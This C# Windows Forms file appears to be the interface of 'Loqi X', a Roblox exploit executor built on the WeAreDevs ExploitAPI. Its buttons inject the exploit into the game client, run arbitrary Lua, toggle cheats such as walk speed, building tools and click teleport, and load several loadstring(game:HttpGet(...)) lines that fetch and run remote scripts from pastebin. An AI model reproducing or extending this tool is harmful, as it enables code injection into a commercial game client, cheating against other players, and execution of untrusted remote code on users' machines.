﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;

namespace Loqi_X
{
    public partial class loqisploit : Form
    {
        ExploitAPI api = new ExploitAPI();
        public loqisploit()
        {
            InitializeComponent();
        }

        private void flatTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void flatButton3_Click(object sender, EventArgs e)
        {
            api.LaunchExploit();
            string xtr = "loqi X injected";
            api.ConsoleWarn(xtr);

            string t1 = "Loqi X Loaded!";
            string t2 = "me";
            api.ForceBubbleChat(t2, t1);
        }

        private void flatButton1_Click(object sender, EventArgs e)
        {
            string text = fastColoredTextBox1.Text;
            api.SendLuaScript(text);
        }

        private void flatButton2_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "";
        }

        private void flatLabel2_Click(object sender, EventArgs e)
        {

        }

        private void flatLabel1_Click(object sender, EventArgs e)
        {

        }

        private void flatButton4_Click(object sender, EventArgs e)
        {
            api.DoBTools();
        }

        private void flatButton5_Click(object sender, EventArgs e)
        {
            api.SetWalkSpeed();
        }

        private void flatButton6_Click(object sender, EventArgs e)
        {
            api.ToggleClickTeleport();
        }

        private void flatButton7_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/AhduVjkq'))()";
        }

        private void flatButton8_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/S0GD3g2b'))()";
        }

        private void flatButton9_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/Li3UQD0b'))()";
        }

        private void flatButton10_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/t2fmrD3K'))()";
        }

        private void flatButton12_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/4Rq0a2bq'))()";
        }

        private void flatButton13_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/jRQ8MNAX'))()";
        }

        private void flatButton14_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/yCrBkPaY'))()";
        }

        private void flatButton11_Click(object sender, EventArgs e)
        {
            fastColoredTextBox1.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/nWy8JgEM'))()";
        }
    }
}
